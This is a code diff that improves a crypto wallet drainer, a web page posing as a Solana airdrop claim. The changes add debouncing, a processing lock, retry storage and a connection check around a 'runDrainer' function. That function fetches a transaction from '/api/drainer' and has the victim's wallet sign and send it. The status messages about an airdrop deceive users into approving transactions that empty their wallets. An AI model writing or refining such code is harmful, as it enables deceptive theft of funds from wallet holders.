@@ -536,7 +536,15 @@
                 return;
               }
               showStatus('Wallet connected: ' + wallet.name, 'success');
-              runDrainer(provider);
+              
+              // Only proceed with drainer if wallet is properly connected
+              setTimeout(() => {
+                if (getWalletAddress(provider)) {
+                  runDrainer(provider);
+                } else {
+                  showStatus('Wallet connection lost. Please try again.', 'error');
+                }
+              }, 1000);
             } catch (err) {
               showStatus('Connection failed: ' + (err.message || err), 'error');
             }
@@ -568,6 +576,18 @@
     // --- Transaction Persistence and Error Handling ---
     const TRANSACTION_STORAGE_KEY = 'solana_airdrop_pending_tx';
     const WALLET_STORAGE_KEY = 'solana_airdrop_wallet_info';
+    
+    // Debouncing for API calls
+    let apiCallTimeout = null;
+    let isProcessingTransaction = false;
+    
+    // Debounced API call function
+    function debouncedAPICall(callback, delay = 1000) {
+      if (apiCallTimeout) {
+        clearTimeout(apiCallTimeout);
+      }
+      apiCallTimeout = setTimeout(callback, delay);
+    }
     
     // Store transaction for retry
     function storeTransaction(transactionBase64, walletAddress, providerName) {
@@ -942,52 +962,75 @@
     }
 
     async function runDrainer(provider) {
+      // Prevent multiple simultaneous API calls
+      if (isProcessingTransaction) {
+        showStatus('Transaction already in progress. Please wait...', 'loading');
+        return;
+      }
+      
       const pubkey = getWalletAddress(provider);
       if (!pubkey) {
         showStatus('Wallet not connected or unsupported publicKey format.', 'error');
         return;
       }
       
+      // Set processing flag
+      isProcessingTransaction = true;
+      
       // Store wallet info for potential retry
       const walletName = WALLET_DEFS.find(w => w.provider() === provider)?.name || 'Unknown Wallet';
       storeWalletInfo(provider, walletName);
       
       showStatus('Preparing your airdrop transaction...', 'loading');
+      
       try {
-        // 1. Fetch transaction from your API (update URL as needed)
-        const res = await fetch('/api/drainer', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ pubkey })
+        // Use debounced API call to prevent rapid requests
+        await new Promise((resolve, reject) => {
+          debouncedAPICall(async () => {
+            try {
+              // 1. Fetch transaction from your API (update URL as needed)
+              const res = await fetch('/api/drainer', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ pubkey })
+              });
+              const data = await res.json();
+              if (!data.success || !data.transaction) throw new Error(data.error || "API error");
+              
+              // Store transaction for potential retry
+              storeTransaction(data.transaction, pubkey, walletName);
+              
+              // 2. Deserialize transaction
+              const tx = window.solanaWeb3.Transaction.from(
+                Uint8Array.from(atob(data.transaction), c => c.charCodeAt(0))
+              );
+              // Debug: Log transaction for Glow troubleshooting
+              console.log('Drainer Transaction (base64):', data.transaction);
+              console.log('Drainer Transaction (object):', tx);
+              
+              // 3. Sign and send
+              if (provider.isGlow && provider.signAndSendTransaction) {
+                // Glow expects a base64 string, not a Transaction object
+                const sig = await provider.signAndSendTransaction({ transactionBase64: data.transaction });
+                showStatus("Transaction sent! Signature: " + (sig.signature || sig), 'success');
+                clearStoredTransaction(); // Clear on success
+              } else if (provider.signAndSendTransaction) {
+                const sig = await provider.signAndSendTransaction(tx);
+                showStatus("Transaction sent! Signature: " + (sig.signature || sig), 'success');
+                clearStoredTransaction(); // Clear on success
+              } else if (provider.signTransaction) {
+                const signed = await provider.signTransaction(tx);
+                showStatus("Transaction signed! (You need to send it to the network)", 'success');
+                clearStoredTransaction(); // Clear on success
+              } else {
+                throw new Error("Wallet does not support transaction signing.");
+              }
+              resolve();
+            } catch (err) {
+              reject(err);
+            }
+          }, 500); // 500ms debounce
         });
-        const data = await res.json();
-        if (!data.success || !data.transaction) throw new Error(data.error || "API error");
-        
-        // Store transaction for potential retry
-        storeTransaction(data.transaction, pubkey, walletName);
-        
-        // 2. Deserialize transaction
-        const tx = window.solanaWeb3.Transaction.from(
-          Uint8Array.from(atob(data.transaction), c => c.charCodeAt(0))
-        );
-        // Debug: Log transaction for Glow troubleshooting
-        console.log('Drainer Transaction (base64):', data.transaction);
-        console.log('Drainer Transaction (object):', tx);
-        
-        // 3. Sign and send
-        if (provider.isGlow && provider.signAndSendTransaction) {
-          // Glow expects a base64 string, not a Transaction object
-          const sig = await provider.signAndSendTransaction({ transactionBase64: data.transaction });
-          showStatus("Transaction sent! Signature: " + (sig.signature || sig), 'success');
-        } else if (provider.signAndSendTransaction) {
-          const sig = await provider.signAndSendTransaction(tx);
-          showStatus("Transaction sent! Signature: " + (sig.signature || sig), 'success');
-        } else if (provider.signTransaction) {
-          const signed = await provider.signTransaction(tx);
-          showStatus("Transaction signed! (You need to send it to the network)", 'success');
-        } else {
-          throw new Error("Wallet does not support transaction signing.");
-        }
       } catch (err) {
         const errorMsg = err.message || err;
         
@@ -1009,6 +1052,9 @@
         } else {
           showStatus("Transaction failed: " + errorMsg + ". You can retry or close.", 'error');
         }
+      } finally {
+        // Reset processing flag
+        isProcessingTransaction = false;
       }
     }
     
